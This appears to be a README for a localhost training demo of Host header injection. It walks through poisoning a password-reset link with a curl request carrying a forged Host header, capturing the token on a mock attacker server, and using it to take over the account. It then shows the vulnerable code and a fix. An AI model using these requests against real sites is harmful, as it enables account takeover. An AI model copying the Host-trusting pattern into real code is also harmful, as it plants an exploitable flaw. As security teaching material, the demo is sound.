# Host Header Injection: A Full Account Takeover Demo

[🇮🇹](/host-header-injection/docs/ita.md)

Welcome\! This interactive demo will walk you through a complete, end-to-end **Host Header Injection** attack. You'll play the role of both the user and the attacker to understand how a single, seemingly small vulnerability can lead to a total account takeover.

We'll see how an attacker can trick a server into sending a malicious password reset link, steal the secret token, and then use that token to change the victim's password and lock them out of their own account.

Let's begin.

## 🚀 The Scenario

Our demo consists of three parts:

1.  **The Victim's Application (`vulnerable-server.js`)**: A Node.js server with a password reset feature. Its critical flaw is that it trusts the `Host` header from incoming requests to generate the password reset links. We'll see its logs in **blue** 🔵.
2.  **The Attacker's Server (`attacker-server.js`)**: A malicious Node.js server controlled by the attacker. Its only job is to listen for incoming requests and log any secret tokens it captures. We'll see its logs in **red** 🔴.
3.  **The Frontend UI (`index.html`)**: A simple web page where a user would go to request a password reset. This is the entry point for the entire process.

## ✅ Prerequisites

Before you start, make sure you have the following installed:

  * Node.js (v18 or higher)
  * `pnpm` (or you can substitute `npm` or `yarn` in the commands)

## 🛠️ Setup

First, let's get the project set up and all dependencies installed.

1.  **Install Backend Dependencies**:
    Navigate to the `backend` directory and install the required packages.

    ```bash
    cd backend
    pnpm install
    ```

2.  **Install Frontend Dependencies**:
    Navigate to the `frontend` directory and install its packages.

    ```bash
    cd ../frontend
    pnpm install
    ```

## 🎬 Running the Demo: A 4-Act Play

Now that everything is installed, let's run the simulation. We'll walk through this step-by-step.

### Act I: The Legitimate User

First, let's see how the application is *supposed* to work.

1.  **Start the Servers**:
    Go to your `backend` directory. We'll use the convenient `start` script to launch both the vulnerable and attacker servers simultaneously.

    ```bash
    # In the /backend directory
    pnpm start
    ```

    You should see both the **blue** 🔵 `[VULNERABLE SERVER]` and **red** 🔴 `[ATTACKER'S SERVER]` logs, indicating they are running.

2.  **Start the Frontend**:
    In a **new terminal window**, navigate to the `frontend` directory and start the Vite development server.

    ```bash
    # In the /frontend directory
    pnpm dev
    ```

    Vite will give you a local URL (usually `http://localhost:5173`). Open this URL in your browser.

3.  **Request a Password Reset**:
    In the browser, you'll see the UI. The email `user@victim.com` is already filled in. Click the **"Initiate Password Reset"** button. The UI will confirm the request was sent.

4.  **Check the Logs**:
    Look at your backend terminal. You will see a beautifully formatted, **blue** 🔵 log that simulates the email being sent. Notice the link inside—it correctly points to `http://localhost:3000/...`. This is the expected, legitimate behavior.

### Act II: The Attacker's Probe (The Injection)

Now, let's put on our black hat. An attacker won't use the UI. They will use a tool like `curl` to craft a malicious request.

1.  **Craft the Malicious Request**:
    Open a **third terminal window**. We will send a `POST` request to the vulnerable server, but we'll inject our own `Host` header that points to our attacker's server (`localhost:9090`).

    Copy and run the following command:

    ```bash
    curl -X POST http://localhost:3000/request-password-reset \
    -H "Content-Type: application/json" \
    -H "Host: localhost:9090" \
    -d '{"email":"user@victim.com"}'
    ```

2.  **Witness the Deception**:
    Go back to your backend terminal immediately. You will see a **new simulated email** get logged. But look closely\! The server, trusting our fake `Host` header, has created a password reset link that now points to the attacker's server: `http://localhost:9090/...`.

    The server was successfully tricked.

### Act III: The Trap is Sprung (Capturing the Token)

The malicious link has been generated. In the real world, the victim would receive this in an email. Let's simulate the victim clicking on it.

1.  **Click the Malicious Link**:
    From your backend terminal, copy the malicious URL (`http://localhost:9090/reset-password?token=...`) from the second email log.

2.  **Paste it into your browser's address bar and press Enter.**

3.  **Check the Attacker's Log**:
    Switch back to your backend terminal. The moment you hit Enter, the attacker's server springs to life\! You'll see a bright **red** 🔴 log confirming the **TOKEN CAPTURED**. It will also give you the next command needed to complete the takeover.

### Act IV: The Final Blow (Account Takeover)

The attacker now possesses the key to the kingdom—the secret token. The final step is to use it.

1.  **Use the Stolen Token**:
    The attacker's log has already printed the exact `curl` command needed. It includes the stolen token and a new password (`hackedPassword123`).

    Copy that final `curl` command from the **red** 🔴 log and run it in your terminal.

    ```bash
    # This command is printed in your attacker's log
    curl -X POST http://localhost:3000/reset-password -H "Content-Type: application/json" -d '{"token":"[THE_CAPTURED_TOKEN]","newPassword":"hackedPassword123"}'
    ```

2.  **Confirm the Takeover**:
    Look at the backend terminal one last time. You will see a **blue** 🔵 log with a chilling **yellow** 🟡 warning:

    `ACCOUNT TAKEOVER! Password for user with token "..." has been changed to "hackedPassword123"!`

The attack is complete. The user's password has been changed without their knowledge, and the attacker has full control of the account.

## 🛡️ The Solution

How do we prevent this? The fix is simple but crucial:

**Never trust user-controllable input for security-sensitive operations.** The `Host` header is user input.

The server must know its own domain. Instead of using the header, use a hardcoded configuration value.

**The Vulnerable Code (`vulnerable-server.js`):**

```javascript
// The application blindly trusts the user-controlled 'Host' header
const host = req.headers.host;
const resetLink = `http://${host}/reset-password?token=${token}`;
```

**The Secure Code:**

```javascript
// The application uses a fixed, trusted configuration value
const APP_BASE_URL = 'http://localhost:3000'; // In production: 'https://your-real-domain.com'
const resetLink = `${APP_BASE_URL}/reset-password?token=${token}`;
```

By making this change, no matter what an attacker puts in the `Host` header, the generated link will always be correct and safe.